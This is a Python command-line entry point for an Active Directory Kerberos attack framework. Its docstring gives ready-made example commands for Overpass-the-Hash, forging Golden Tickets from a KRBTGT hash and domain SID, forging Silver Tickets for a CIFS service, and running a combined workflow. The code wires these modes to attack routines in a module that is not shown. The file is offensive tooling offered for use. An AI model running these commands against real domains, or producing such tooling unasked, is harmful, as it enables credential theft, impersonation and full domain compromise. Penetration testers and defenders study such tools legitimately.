#!/usr/bin/env python3
"""
CLI Entry Point — Pass-the-Ticket & Overpass-the-Hash Framework

Examples:
    # Overpass-the-Hash (get TGT from NTLM hash)
    python -m ticket_framework -d corp.local --dc 10.10.10.1 \\
        --opth -u admin -H aad3b435:31d6cfe0

    # Golden Ticket
    python -m ticket_framework -d corp.local --dc 10.10.10.1 \\
        --golden -u Administrator --user-id 500 \\
        --krbtgt-hash <KRBTGT_NTLM> --domain-sid S-1-5-21-...

    # Silver Ticket
    python -m ticket_framework -d corp.local --dc 10.10.10.1 \\
        --silver -u Administrator --service-hash <HASH> \\
        --spn CIFS/fileserver.corp.local --target fileserver.corp.local

    # Full workflow
    python -m ticket_framework -d corp.local --dc 10.10.10.1 \\
        --full -u admin -p 'Password1' --krbtgt-hash <HASH>
"""

import argparse

from .core.framework import TicketAttackFramework


def main():
    parser = argparse.ArgumentParser(
        description="Pass-the-Ticket & Overpass-the-Hash Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    parser.add_argument("-d", "--domain", required=True, help="Domain name")
    parser.add_argument("--dc", required=True, help="Domain controller IP")
    parser.add_argument("-u", "--username", required=True, help="Username to impersonate")
    parser.add_argument("-p", "--password", default="", help="Password")
    parser.add_argument("-H", "--hash", default="", help="NTLM hash")
    parser.add_argument("--aes-key", default="", help="AES256 key")
    parser.add_argument("-o", "--output", default="ticket_attacks", help="Output directory")

    # Attack modes
    attack = parser.add_mutually_exclusive_group(required=True)
    attack.add_argument("--opth", action="store_true", help="Overpass-the-Hash")
    attack.add_argument("--golden", action="store_true", help="Golden Ticket")
    attack.add_argument("--silver", action="store_true", help="Silver Ticket")
    attack.add_argument("--full", action="store_true", help="Full workflow")

    # Golden Ticket args
    parser.add_argument("--user-id", type=int, default=500, help="User RID")
    parser.add_argument("--krbtgt-hash", default="", help="KRBTGT NTLM hash")
    parser.add_argument("--krbtgt-aes", default="", help="KRBTGT AES256 key")
    parser.add_argument("--domain-sid", default="", help="Domain SID")

    # Silver Ticket args
    parser.add_argument("--service-hash", default="", help="Service account NTLM hash")
    parser.add_argument("--spn", default="", help="Service Principal Name")
    parser.add_argument("--target", default="", help="Target hostname")

    args = parser.parse_args()

    framework = TicketAttackFramework(
        domain=args.domain, dc_ip=args.dc, output_dir=args.output
    )

    if args.domain_sid:
        framework.domain_sid = args.domain_sid

    if args.opth:
        framework.overpass_the_hash(
            args.username, ntlm_hash=args.hash,
            aes256_key=args.aes_key, password=args.password,
        )

    elif args.golden:
        if not framework.domain_sid:
            framework.get_domain_sid(args.username, args.password, args.hash)
        framework.golden_ticket(
            args.username, args.user_id, args.krbtgt_hash, args.krbtgt_aes,
        )

    elif args.silver:
        if not framework.domain_sid:
            framework.get_domain_sid(args.username, args.password, args.hash)
        framework.silver_ticket(
            args.username, args.service_hash, args.spn, args.target,
        )

    elif args.full:
        framework.run_full_workflow(
            args.username, args.password, args.hash,
            args.krbtgt_hash, args.krbtgt_aes, args.target,
        )


if __name__ == "__main__":
    main()